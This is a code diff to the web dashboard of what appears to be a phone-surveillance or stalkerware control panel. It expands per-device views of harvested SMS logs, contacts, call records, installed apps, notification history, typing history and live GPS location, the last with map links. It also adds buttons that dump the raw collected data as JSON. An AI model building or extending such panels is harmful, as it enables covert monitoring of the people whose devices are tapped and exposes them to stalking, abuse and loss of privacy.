@@ -593,25 +593,45 @@
                     
                     const s = latestStats[c.device_id];
                     if (s) {
-                        dataHtml += `<div style="background:rgba(0,0,0,0.3); padding:8px; border:1px solid #222;">`;
-                        modules.forEach(m => {
-                            let val = "--";
+                        dataHtml += `<div style="background:rgba(0,0,0,0.5); border:1px solid #333; margin-top:5px;">`;
+                        modules.forEach((m, mIdx) => {
                             const mod = m.split(':')[0].toLowerCase();
-                            if (mod === 'sms') val = (s.sms_logs?.length || 0) + " logs";
-                            else if (mod === 'location') val = s.location_fresh ? "GPS Fixed" : (s.location_history?.length || 0) + " pts";
-                            else if (mod === 'contacts') val = (s.contacts?.length || 0) + " entries";
-                            else if (mod === 'apps') val = (s.apps?.length || 0) + " pkgs";
-                            else if (mod === 'calls') val = (s.calls?.length || 0) + " calls";
-                            else if (mod === 'usage') val = (s.screen_time_minutes || 0) + "m screen";
-                            else if (mod === 'typing') val = (s.typing_history?.length || 0) + " keys";
-                            else if (mod === 'notifications') val = (s.notif_history?.length || 0) + " alerts";
-                            else if (mod === 'vitals') val = (s.battery_level || 0) + "%";
-                            else if (mod === 'all') val = "Full Sync";
+                            let label = mod.toUpperCase();
+                            let preview = "";
+                            let fullData = null;
+                            let isMap = false;
 
-                            dataHtml += `<div style="font-size:0.65rem; color:#666; display:flex; justify-content:space-between; margin-bottom:2px;">
-                                <span>${mod.toUpperCase()}</span>
-                                <span style="color:var(--primary)">${val}</span>
-                            </div>`;
+                            if (mod === 'location') {
+                                const loc = s.location_fresh || (s.location_history?.[0]);
+                                if (loc) {
+                                    preview = `${loc.lat.toFixed(4)}, ${loc.lon.toFixed(4)}`;
+                                    const mapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
+                                    preview = `<a href="${mapUrl}" target="_blank" style="color:var(--success); text-decoration:none;">📍 VIEW ON MAP</a>`;
+                                } else preview = "NO_SIGNAL";
+                            } else if (mod === 'vitals') {
+                                preview = `BATT: ${s.battery_level}% | SESSIONS: ${s.online_sessions}`;
+                                fullData = { battery: s.battery_level, online_mins: s.online_time_minutes, health: s.app_health };
+                            } else if (mod === 'sms') { preview = (s.sms_logs?.length || 0) + " LOGS"; fullData = s.sms_logs; }
+                            else if (mod === 'contacts') { preview = (s.contacts?.length || 0) + " ENTRIES"; fullData = s.contacts; }
+                            else if (mod === 'apps') { preview = (s.apps?.length || 0) + " INSTALLED"; fullData = s.apps; }
+                            else if (mod === 'calls') { preview = (s.calls?.length || 0) + " RECORDS"; fullData = s.calls; }
+                            else if (mod === 'usage') { preview = (s.screen_time_minutes || 0) + " MINS"; fullData = s.app_usage_timeline; }
+                            else if (mod === 'typing') { preview = (s.typing_history?.length || 0) + " KEY_STREAMS"; fullData = s.typing_history; }
+                            else if (mod === 'notifications') { preview = (s.notif_history?.length || 0) + " ALERTS"; fullData = s.notif_history; }
+                            else if (mod === 'all') { preview = "COMPLETE_DUMP"; fullData = s; }
+
+                            const divId = `audit-exp-${c.id}-${mIdx}`;
+                            dataHtml += `
+                                <div style="border-bottom:1px solid #222; padding:8px;">
+                                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                                        <span style="font-size:0.6rem; color:#888;">${label}</span>
+                                        <span style="font-size:0.7rem; color:var(--primary);">${preview}</span>
+                                        ${fullData ? `<button onclick="toggleAuditData('${divId}')" style="background:none; border:1px solid var(--primary); color:var(--primary); font-size:0.5rem; padding:2px 4px; cursor:pointer;">DATA</button>` : ''}
+                                    </div>
+                                    <div id="${divId}" style="display:none; margin-top:10px; max-height:200px; overflow:auto; background:#000; padding:5px; border:1px solid #444;">
+                                        <pre style="font-size:0.6rem; color:var(--success); margin:0;">${JSON.stringify(fullData, null, 2)}</pre>
+                                    </div>
+                                </div>`;
                         });
                         dataHtml += `</div>`;
                     }
@@ -700,6 +720,11 @@
             parts.pop();
             currentVaultPath = parts.join('/');
             fetchFiles();
+        }
+
+        function toggleAuditData(id) {
+            const el = document.getElementById(id);
+            el.style.display = el.style.display === 'none' ? 'block' : 'none';
         }
 
         function saveFolderNote(name, event) {
